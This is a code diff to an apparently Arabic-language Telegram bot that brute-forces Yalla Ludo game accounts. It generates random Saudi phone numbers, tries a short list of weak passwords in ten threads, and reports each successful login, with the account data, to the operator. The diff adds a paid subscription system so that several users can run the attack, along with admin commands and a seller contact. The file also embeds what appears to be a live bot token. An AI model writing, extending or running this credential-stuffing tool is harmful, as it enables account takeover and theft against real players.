@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# © Q_b_h — Telegram Bot Control Version
+# © Q_b_h — Telegram Bot Control Version (Multi-User & Subscriptions)
 
 import base64
 import hashlib
@@ -14,6 +14,8 @@ import sys
 import time
 import uuid
 import threading
+from datetime import datetime, timedelta
+import math
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Any, Dict, List, Optional, Set
 
@@ -25,19 +27,81 @@ from telebot import types
 
 # === إعدادات البوت والمطور ===
 TG_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"
-ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بالتحكم
+ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بالتحكم وإدارة الاشتراكات
 
 bot = telebot.TeleBot(TG_TOKEN)
 
-# متغيرات التحكم بحالة الفحص
-is_running = False
-check_thread = None
-stop_event = threading.Event()
-stats_lock = threading.Lock()
-valid_count = 0
-wrong_count = 0
-error_count = 0
+# ملف تخزين الاشتراكات
+SUB_FILE = "subscriptions.json"
 
+def load_subscriptions() -> dict:
+    if os.path.exists(SUB_FILE):
+        try:
+            with open(SUB_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            return {}
+    return {}
+
+def save_subscriptions(subs: dict):
+    try:
+        with open(SUB_FILE, "w", encoding="utf-8") as f:
+            json.dump(subs, f, ensure_ascii=False, indent=4)
+    except Exception as e:
+        print("خطأ في حفظ الاشتراكات:", e)
+
+def get_subscription_status(user_id: int) -> tuple[bool, str]:
+    if user_id == ADMIN_ID:
+        return True, "المطور (صلاحيات كاملة ودائمة)"
+    
+    subs = load_subscriptions()
+    str_uid = str(user_id)
+    if str_uid not in subs:
+        return False, "غير مشترك ❌"
+    
+    expiry_time = subs[str_uid]
+    if time.time() > expiry_time:
+        return False, "منتهي الصلاحية ⌛"
+    
+    remaining_days = math.ceil((expiry_time - time.time()) / 86400)
+    return True, f"مفعل ✅ (يتبقى {remaining_days} يوم)"
+
+def add_subscription(user_id: int, days: int):
+    subs = load_subscriptions()
+    str_uid = str(user_id)
+    
+    current_time = time.time()
+    if str_uid in subs and subs[str_uid] > current_time:
+        base_time = subs[str_uid]
+    else:
+        base_time = current_time
+        
+    new_expiry = base_time + (days * 86400)
+    subs[str_uid] = new_expiry
+    save_subscriptions(subs)
+    return new_expiry
+
+# === نظام عزل الجلسات والنتائج لكل مستخدم (Per-User Sessions) ===
+user_sessions = {}
+
+class UserSession:
+    def __init__(self, chat_id: int):
+        self.chat_id = chat_id
+        self.is_running = False
+        self.stop_event = threading.Event()
+        self.stats_lock = threading.Lock()
+        self.valid_count = 0
+        self.wrong_count = 0
+        self.error_count = 0
+        self.thread = None
+        self.tried: Set[str] = set()
+
+def get_user_session(chat_id: int) -> UserSession:
+    if chat_id not in user_sessions:
+        user_sessions[chat_id] = UserSession(chat_id)
+    return user_sessions[chat_id]
+
+# التحقق من ملف التراخيص الخارجي (الخاص بك)
 _LIC_URL = "https://raw.githubusercontent.com/replicate88876788/Tesr/refs/heads/main/a.txt"
 try:
     _r = requests.get(_LIC_URL, timeout=10)
@@ -399,117 +463,186 @@ def generate_saudi_number() -> str:
     prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
     return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
 
-# === دوال تليجرام وأزرار التحكم ===
+# === دوال تليجرام وأزرار التحكم لكل مستخدم ===
 
-def get_control_keyboard(running: bool):
+def get_control_keyboard(running: bool, is_admin: bool = False):
     markup = types.InlineKeyboardMarkup()
     if not running:
         markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
+    
+    if is_admin:
+        markup.add(types.InlineKeyboardButton("⚙️ إدارة الاشتراكات", callback_data="admin_subs"))
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ عذراً، هذا البوت مخصص للمطور فقط.")
+    user_id = message.from_user.id
+    is_active, sub_msg = get_subscription_status(user_id)
+    is_admin = (user_id == ADMIN_ID)
+
+    if not is_active and not is_admin:
+        bot.reply_to(
+            message,
+            "❌ <b>عذراً، ليس لديك اشتراك فعال في البوت.</b>\n\n"
+            f"حالة الاشتراك: {sub_msg}\n"
+            "يرجى التواصل مع المطور لتفعيل اشتراكك: @aboodriad",
+            parse_mode="HTML"
+        )
         return
-    
+
     text = (
         "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
-        "حالة الفحص حالياً: <b>متوقف 🛑</b>\n"
-        "اضغط على الزر أدناه لبدء عملية الفحص التلقائي:"
+        f"👤 حالة اشتراكك: <b>{sub_msg}</b>\n"
+        "حالة الفحص الخاص بك: <b>متوقف 🛑</b>\n\n"
+        "اضغط على الزر أدناه لبدء عملية الفحص التلقائي الخاصة بك:"
     )
-    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(is_running))
+    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(False, is_admin))
+
+# أوامر المطور لإدارة الاشتراكات عبر الشات
+@bot.message_handler(commands=['addsub'])
+def cmd_add_subscription(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    parts = message.text.split()
+    if len(parts) < 3:
+        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n<code>/addsub الـآيدي عدد_الأيام</code>", parse_mode="HTML")
+        return
+    
+    try:
+        target_id = int(parts[1])
+        days = int(parts[2])
+        new_expiry = add_subscription(target_id, days)
+        expiry_date = datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M:%S')
+        bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم <code>{target_id}</code> لمدة <b>{days} يوم</b>.\n📅 ينتهي في: {expiry_date}", parse_mode="HTML")
+    except ValueError:
+        bot.reply_to(message, "❌ تأكد من أن الآيدي وعدد الأيام عبارة عن أرقام صحيحة.")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    global is_running, check_thread, valid_count, wrong_count, error_count
+    chat_id = call.message.chat.id
+    user_id = call.from_user.id
+    is_admin = (user_id == ADMIN_ID)
+    is_active, _ = get_subscription_status(user_id)
 
-    if call.from_user.id != ADMIN_ID:
-        bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية للتحكم!", show_alert=True)
+    if not is_active and not is_admin:
+        bot.answer_callback_query(call.id, "❌ انتهت صلاحية اشتراكك!", show_alert=True)
         return
 
+    session = get_user_session(chat_id)
+
     if call.data == "start_check":
-        if is_running:
-            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل بالفعل!")
+        if session.is_running:
+            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
             return
         
-        is_running = True
-        stop_event.clear()
-        valid_count = 0
-        wrong_count = 0
-        error_count = 0
+        session.is_running = True
+        session.stop_event.clear()
+        session.valid_count = 0
+        session.wrong_count = 0
+        session.error_count = 0
 
-        # بدء خيط الفحص الخلفي
-        check_thread = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, call.message.message_id))
-        check_thread.daemon = True
-        check_thread.start()
+        # بدء خيط الفحص الخاص بهذا المستخدم فقط
+        session.thread = threading.Thread(target=run_checker_loop, args=(chat_id, call.message.message_id))
+        session.thread.daemon = True
+        session.thread.start()
 
         bot.answer_callback_query(call.id, "✅ تم بدء الفحص بنجاح")
         bot.edit_message_text(
-            "🚀 <b>جاري فحص الحسابات الآن...</b>\n\n"
-            f"✅ صيد (Valid): {valid_count}\n"
-            f"❌ خطأ (Wrong): {wrong_count}\n"
-            f"⚠️ أخطاء اتصال (Errors): {error_count}",
-            chat_id=call.message.chat.id,
+            "🚀 <b>جاري فحص الحسابات في جلستك الخاصة...</b>\n\n"
+            f"✅ صيد (Valid): {session.valid_count}\n"
+            f"❌ خطأ (Wrong): {session.wrong_count}\n"
+            f"⚠️ أخطاء اتصال (Errors): {session.error_count}",
+            chat_id=chat_id,
             message_id=call.message.message_id,
             parse_mode="HTML",
-            reply_markup=get_control_keyboard(True)
+            reply_markup=get_control_keyboard(True, is_admin)
         )
 
     elif call.data == "stop_check":
-        if not is_running:
-            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف مسبقاً!")
+        if not session.is_running:
+            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف مسبقاً لديك!")
             return
 
-        is_running = False
-        stop_event.set()
+        session.is_running = False
+        session.stop_event.set()
 
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
         
-        # العودة إلى الواجهة الرئيسية مع عرض ملخص النتائج النهائية
         main_text = (
             "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
             "حالة الفحص حالياً: <b>متوقف 🛑</b>\n\n"
-            f"📊 <b>ملخص النتائج النهائية:</b>\n"
-            f"✅ صيد (Valid): {valid_count}\n"
-            f"❌ خطأ (Wrong): {wrong_count}\n"
-            f"⚠️ أخطاء اتصال (Errors): {error_count}\n\n"
+            f"📊 <b>ملخص نتائج جلستك النهائية:</b>\n"
+            f"✅ صيد (Valid): {session.valid_count}\n"
+            f"❌ خطأ (Wrong): {session.wrong_count}\n"
+            f"⚠️ أخطاء اتصال (Errors): {session.error_count}\n\n"
             "اضغط على الزر أدناه لبدء فحص جديد:"
         )
         bot.edit_message_text(
             main_text,
-            chat_id=call.message.chat.id,
+            chat_id=chat_id,
             message_id=call.message.message_id,
             parse_mode="HTML",
-            reply_markup=get_control_keyboard(False)
+            reply_markup=get_control_keyboard(False, is_admin)
         )
 
-def run_checker_loop(chat_id, msg_id):
-    global valid_count, wrong_count, error_count, is_running
-    
+    elif call.data == "admin_subs":
+        if not is_admin:
+            bot.answer_callback_query(call.id, "❌ مخصص للمطور فقط!", show_alert=True)
+            return
+        
+        subs = load_subscriptions()
+        text = "⚙️ <b>قائمة المشتركين الحاليين:</b>\n\n"
+        if not subs:
+            text += "لا يوجد مشتركين حالياً.\n"
+        else:
+            for uid, exp in subs.items():
+                rem = math.ceil((exp - time.time()) / 86400)
+                status_str = f"يتبقى {rem} يوم" if rem > 0 else "منتهي"
+                text += f"• <code>{uid}</code> ⟵ {status_str}\n"
+        
+        text += "\nلإضافة اشتراك استخدم الأمر:\n<code>/addsub [user_id] [days]</code>"
+        
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
+        
+        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)
+
+    elif call.data == "back_home":
+        if not is_active and not is_admin:
+            return
+        is_active_sub, sub_msg = get_subscription_status(user_id)
+        main_text = (
+            "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
+            f"👤 حالة اشتراكك: <b>{sub_msg}</b>\n"
+            "حالة الفحص الخاص بك: <b>متوقف 🛑</b>\n\n"
+            "اضغط على الزر أدناه لبدء عملية الفحص التلقائي الخاصة بك:"
+        )
+        bot.edit_message_text(main_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_control_keyboard(False, is_admin))
+
+def run_checker_loop(chat_id: int, msg_id: int):
+    session = get_user_session(chat_id)
     max_threads = 10
     passwords = ["Aa123123", "Aa123456", "Aa12341234", "Aa12345678"]
-    tried: Set[str] = set()
 
     def worker():
-        global valid_count, wrong_count, error_count
-        while is_running and not stop_event.is_set():
+        while session.is_running and not session.stop_event.is_set():
             mobile = generate_saudi_number()
-            with stats_lock:
-                if mobile in tried:
+            with session.stats_lock:
+                if mobile in session.tried:
                     continue
-                tried.add(mobile)
+                session.tried.add(mobile)
 
             password = random.choice(passwords)
             res = login(mobile, password, timeout=TIMEOUT, server=SERVER, fetch_gems=True)
 
-            with stats_lock:
-                if not is_running or stop_event.is_set():
+            with session.stats_lock:
+                if not session.is_running or session.stop_event.is_set():
                     break
                 if res["success"]:
-                    valid_count += 1
+                    session.valid_count += 1
                     prof = res.get("profile")
                     txt = _tg_text(res["data"], mobile, password, profile=prof)
                     try:
@@ -518,45 +651,45 @@ def run_checker_loop(chat_id, msg_id):
                         pass
                 else:
                     if "error" in res or res.get("http"):
-                        error_count += 1
+                        session.error_count += 1
                     else:
-                        wrong_count += 1
+                        session.wrong_count += 1
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [executor.submit(worker) for _ in range(max_threads)]
         
-        while is_running and not stop_event.is_set():
-            # فحص سريع لـ 3 ثوانٍ مقسمة لفحص حالة التوقف بانتظام ومنع التداخل
+        while session.is_running and not session.stop_event.is_set():
             for _ in range(30):
-                if not is_running or stop_event.is_set():
+                if not session.is_running or session.stop_event.is_set():
                     break
                 time.sleep(0.1)
             
-            if not is_running or stop_event.is_set():
+            if not session.is_running or session.stop_event.is_set():
                 break
                 
-            with stats_lock:
+            with session.stats_lock:
                 status_text = (
-                    "🚀 <b>جاري فحص الحسابات الآن...</b>\n\n"
-                    f"✅ صيد (Valid): {valid_count}\n"
-                    f"❌ خطأ (Wrong): {wrong_count}\n"
-                    f"⚠️ أخطاء اتصال (Errors): {error_count}"
+                    "🚀 <b>جاري فحص الحسابات في جلستك الخاصة...</b>\n\n"
+                    f"✅ صيد (Valid): {session.valid_count}\n"
+                    f"❌ خطأ (Wrong): {session.wrong_count}\n"
+                    f"⚠️ أخطاء اتصال (Errors): {session.error_count}"
                 )
             
-            if not is_running or stop_event.is_set():
+            if not session.is_running or session.stop_event.is_set():
                 break
                 
             try:
+                is_admin = (chat_id == ADMIN_ID)
                 bot.edit_message_text(
                     status_text,
                     chat_id=chat_id,
                     message_id=msg_id,
                     parse_mode="HTML",
-                    reply_markup=get_control_keyboard(True)
+                    reply_markup=get_control_keyboard(True, is_admin)
                 )
             except Exception:
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running and waiting for developer commands...")
+    print("🤖 Bot is running with Subscription System & Isolated User Sessions...")
     bot.infinity_polling()
